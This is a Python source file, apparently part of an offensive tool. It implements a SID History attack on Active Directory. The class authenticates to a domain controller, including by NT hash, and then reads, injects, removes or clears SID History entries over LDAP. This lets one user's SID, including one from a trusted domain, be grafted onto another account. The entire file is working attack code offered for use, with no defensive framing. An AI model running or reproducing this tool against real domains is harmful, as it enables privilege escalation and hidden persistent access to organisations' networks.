"""
SID History Attack Implementation
Main attack class that orchestrates authentication and LDAP operations.
"""

import logging
from typing import Optional, List

from .auth import AuthenticationManager
from .ldap_operations import LDAPOperations
from .sid_utils import SIDConverter


class SIDHistoryAttack:
    """
    Main class for performing SID History attacks from a remote Linux host.
    """

    def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
        """
        Initialize the SID History attack tool.

        Args:
            dc_ip: IP address of the domain controller
            domain: Target domain name
            dc_hostname: Hostname of the DC (optional, for Kerberos/SSL)
        """
        self.dc_ip = dc_ip
        self.domain = domain
        self.dc_hostname = dc_hostname or dc_ip
        
        self.auth_manager = AuthenticationManager(dc_ip, domain, dc_hostname)
        self.connection = None
        self.ldap_ops = None
        self.base_dn = SIDConverter.domain_to_dn(domain)

        logging.info(f"Initialized SID History tool targeting {dc_ip} ({domain})")

    def authenticate(self, auth_method: str, **kwargs) -> bool:
        """
        Authenticate to the domain controller.

        Args:
            auth_method: Authentication method (ntlm, ntlm-hash, kerberos, certificate, simple)
            **kwargs: Authentication parameters (username, password, nt_hash, etc.)

        Returns:
            True if authentication successful, False otherwise
        """
        self.connection = self.auth_manager.get_connection(auth_method, **kwargs)
        
        if self.connection:
            self.ldap_ops = LDAPOperations(self.connection, self.base_dn)
            logging.info(f"Successfully authenticated to {self.dc_ip}")
            return True
        else:
            logging.error("Authentication failed")
            return False

    def disconnect(self):
        """
        Close the connection to the domain controller.
        """
        if self.connection:
            self.connection.unbind()
            logging.info("Disconnected from domain controller")
            self.connection = None
            self.ldap_ops = None

    def get_user_sid(self, sam_account_name: str) -> Optional[str]:
        """
        Retrieve the SID of a user by sAMAccountName.

        Args:
            sam_account_name: The sAMAccountName of the user

        Returns:
            SID as a string, or None if not found
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return None

        return self.ldap_ops.get_user_sid(sam_account_name)

    def get_current_sid_history(self, sam_account_name: str) -> List[str]:
        """
        Retrieve the current SID History of a user.

        Args:
            sam_account_name: The sAMAccountName of the user

        Returns:
            List of SIDs in the user's SID History
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return []

        return self.ldap_ops.get_sid_history(sam_account_name)

    def add_sid_to_history(self, target_user: str, sid_to_add: str) -> bool:
        """
        Add a SID to the SID History attribute of a target user.

        Args:
            target_user: sAMAccountName of the user to modify
            sid_to_add: SID to add to the user's SID History

        Returns:
            True if successful, False otherwise
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return False

        try:
            user_dn = self.ldap_ops.get_user_dn(target_user)
            if not user_dn:
                return False

            current_history = self.ldap_ops.get_sid_history(target_user)
            
            if sid_to_add in current_history:
                logging.warning(f"SID {sid_to_add} already exists in SID History")
                return True

            current_history.append(sid_to_add)
            
            success = self.ldap_ops.modify_sid_history(user_dn, current_history)

            if success:
                logging.info(f"Successfully added SID {sid_to_add} to {target_user}'s SID History")
            
            return success

        except Exception as e:
            logging.error(f"Error adding SID to history: {e}")
            return False

    def inject_sid_history(self, target_user: str, source_user: str, 
                          source_domain: Optional[str] = None) -> bool:
        """
        Inject the SID of a source user into the SID History of a target user.

        Args:
            target_user: sAMAccountName of the user to modify
            source_user: sAMAccountName of the user whose SID to inject
            source_domain: Optional source domain for trusted domain injection

        Returns:
            True if successful, False otherwise
        """
        if source_domain:
            logging.info(f"Injecting SID from {source_user}@{source_domain} into {target_user}")
        else:
            logging.info(f"Injecting SID from {source_user} into {target_user}")

        source_sid = self._get_user_sid_from_domain(source_user, source_domain)
        if not source_sid:
            if source_domain:
                logging.error(f"Could not retrieve SID for {source_user}@{source_domain}")
                logging.error("If this is a trusted domain, you may need to provide the SID directly with --sid")
            else:
                logging.error(f"Could not retrieve SID for source user {source_user}")
            return False

        return self.add_sid_to_history(target_user, source_sid)

    def _get_user_sid_from_domain(self, source_user: str, 
                                  source_domain: Optional[str] = None) -> Optional[str]:
        """
        Get user SID from current domain or trusted domain.

        Args:
            source_user: sAMAccountName of the user
            source_domain: Optional domain to search in (for trusted domains)

        Returns:
            SID as string or None if not found
        """
        if source_domain and source_domain.lower() != self.domain.lower():
            # Try to search in trusted domain using current connection
            # Note: This requires the trusted domain objects to be accessible
            # via the current connection (forest-wide search)
            logging.info(f"Searching for {source_user} in trusted domain {source_domain}")
            
            # Attempt forest-wide search
            try:
                # Try to find the user in the trusted domain
                # For trusted domains, we search using the domain DN
                source_base_dn = SIDConverter.domain_to_dn(source_domain)
                
                # Create temporary LDAPOperations with source domain base
                temp_ldap_ops = LDAPOperations(self.connection, source_base_dn)
                sid = temp_ldap_ops.get_user_sid(source_user)
                if sid:
                    return sid
            except Exception as e:
                logging.debug(f"Forest-wide search failed: {e}")
            
            # If forest-wide search doesn't work, we can't query the trusted domain
            # User needs to provide SID directly
            logging.warning(f"Cannot query trusted domain {source_domain} from current connection")
            logging.warning(f"Please use --sid to provide the SID directly for {source_user}@{source_domain}")
            return None
        
        # Search in current domain
        return self.get_user_sid(source_user)

    def remove_sid_from_history(self, target_user: str, sid_to_remove: str) -> bool:
        """
        Remove a specific SID from a user's SID History.

        Args:
            target_user: sAMAccountName of the user to modify
            sid_to_remove: SID to remove from the user's SID History

        Returns:
            True if successful, False otherwise
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return False

        try:
            user_dn = self.ldap_ops.get_user_dn(target_user)
            if not user_dn:
                return False

            current_history = self.ldap_ops.get_sid_history(target_user)
            
            if sid_to_remove not in current_history:
                logging.warning(f"SID {sid_to_remove} not found in SID History")
                return True

            current_history.remove(sid_to_remove)
            
            success = self.ldap_ops.modify_sid_history(user_dn, current_history)

            if success:
                logging.info(f"Successfully removed SID {sid_to_remove} from {target_user}'s SID History")
            
            return success

        except Exception as e:
            logging.error(f"Error removing SID from history: {e}")
            return False

    def clear_sid_history(self, target_user: str) -> bool:
        """
        Clear all SID History entries for a user.

        Args:
            target_user: sAMAccountName of the user to modify

        Returns:
            True if successful, False otherwise
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return False

        try:
            user_dn = self.ldap_ops.get_user_dn(target_user)
            if not user_dn:
                return False

            success = self.ldap_ops.modify_sid_history(user_dn, [])

            if success:
                logging.info(f"Successfully cleared SID History for {target_user}")
            
            return success

        except Exception as e:
            logging.error(f"Error clearing SID History: {e}")
            return False

